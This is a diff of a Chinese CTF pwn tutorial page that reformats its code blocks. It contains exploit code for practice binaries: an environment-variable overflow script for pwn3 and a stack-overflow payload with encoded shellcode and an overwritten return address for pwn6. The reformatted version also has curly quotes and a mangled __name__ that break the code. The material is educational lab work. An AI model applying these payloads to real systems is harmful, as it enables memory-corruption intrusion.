@@ -175,14 +175,11 @@
 <p>   Python的os模块提供创建子进程以及修改环境变量的函数，其中os.system函数可以创建一个子进程，且子进程会继承父进程的环境变量参数信息；os.putenv可以修改进程的环境变量参数信息。</p>
 <p>   运行脚本就可以把这题pwn成功</p>
 <blockquote>
-<pre><code>import os
-
-defpwn():
-os.putenv(&quot;HEETIAN&quot;,&quot;A&quot;*64+&quot;\x0a\x0d\x0a\x0d&quot;)
-os.system(&quot;./pwn3&quot;)
-if __name__ ==&quot;__main__&quot;:
-pwn()
-</code></pre><p>在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。）</p>
+<p>  import os</p>
+<p>   defpwn():<br>   os.putenv(“HEETIAN”,”A”*64+”\x0a\x0d\x0a\x0d”)<br>   os.system(“./pwn3”)<br>   if <strong>name</strong> ==”<strong>main</strong>“:<br>   pwn()</p>
+</blockquote>
+<p>在shell输入下面指令为子进程添加一个新的环境变量（除了通过export添加环境变量以外，我们还可以通过函数getenv、putenv、setenv等对环境变量进行操作。）</p>
+<blockquote>
 <p>export testenv=”Hello_World”</p>
 </blockquote>
 <p>Linux Shell中，可以使用$()或者两个反引号（<code>）来包裹一条shell命令，并返回shell命令的执行结果。
@@ -204,22 +201,24 @@ pwn()
 <p>   <a href="http://shell-storm.org/shellcode/" target="_blank" rel="external">http://shell-storm.org/shellcode/</a></p>
 <p>   <a href="http://www.exploit-db.com/shellcode/" target="_blank" rel="external">http://www.exploit-db.com/shellcode/</a></p>
 <p>具有复杂功能的Shellcode无法作用于不同类型的操作系统（如Windows、Linux）<br>将pwn6.py 脚本写到test文件里面  然后把test文本拖到pwn6程序里面运行。</p>
-<pre><code>python pwn6.py &gt; test
-./pwn6 &lt; test
-</code></pre><p>shellcod的python脚本</p>
-<pre><code>shellcode = (&quot;\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe&quot; +
-&quot;\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff&quot; +
-&quot;\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69&quot; +
-&quot;\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81&quot;)
-
-print &apos;A&apos;*76 + &apos;\xd0\xd6\xff\xff&apos; + shellcode
-</code></pre><h3 id="七、Pwn基础练习7"><a href="#七、Pwn基础练习7" class="headerlink" title="七、Pwn基础练习7"></a>七、Pwn基础练习7</h3><p><strong>一、__builtin_return_address函数</strong></p>
+<blockquote>
+<p>python pwn6.py test<br>./pwn6 &lt; test</p>
+</blockquote>
+<p>shellcod的python脚本</p>
+<blockquote>
+<p>shellcode = (“\xeb\x12\x31\xc9\x5e\x56\x5f\xb1\x15\x8a\x06\xfe” +<br>“\xc8\x88\x06\x46\xe2\xf7\xff\xe7\xe8\xe9\xff\xff” +<br>“\xff\x32\xc1\x32\xca\x52\x69\x30\x74\x69\x01\x69” +<br>“\x30\x63\x6a\x6f\x8a\xe4\xb1\x0c\xce\x81”)</p>
+<p>print ‘A’*76 + ‘\xd0\xd6\xff\xff’ + shellcode</p>
+</blockquote>
+<h3 id="七、Pwn基础练习7"><a href="#七、Pwn基础练习7" class="headerlink" title="七、Pwn基础练习7"></a>七、Pwn基础练习7</h3><p><strong>一、__builtin_return_address函数</strong></p>
 <p>  <strong>builtin_return_address函数接收一个参数，可以是0,1,2等。</strong>builtin_return_address(0)返回当前函数的返回地址，如果参数增大1，那么就往上走一层获取主调函数的返回地址.</p>
 <p><strong>二、理解多层跳转</strong></p>
 <p>retn指令从栈顶弹出一个数据并赋值给EIP寄存器，程序继续执行时就相当于跳转到这个地址去执行代码了。</p>
 <p>如果我们将返回地址覆盖为一条retn指令的地址，那么就又可以执行一条retn指令了，相当于再在栈顶弹出一个数据赋值给EIP寄存器。</p>
 <p><strong>三、函数作用</strong></p>
-<p><strong>fflush()</strong>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：<br>    int fflush(FILE* stream);</p>
+<p><strong>fflush()</strong>用于清空文件缓冲区，如果文件是以写的方式打开 的，则把缓冲区内容写入文件。其原型为：</p>
+<blockquote>
+<p>int fflush(FILE* stream);</p>
+</blockquote>
 <p>【参数】stream为文件指针。</p>
 <p>【返回值】成功返回0，失败返回EOF，错误代码存于errno 中。指定的流没有缓冲区或者只读打开时也返回0值。</p>
 <p><strong>fflush()</strong>也可用于标准输入（stdin）和标准输出（stdout），用来清空标准输入输出缓冲区。</p>
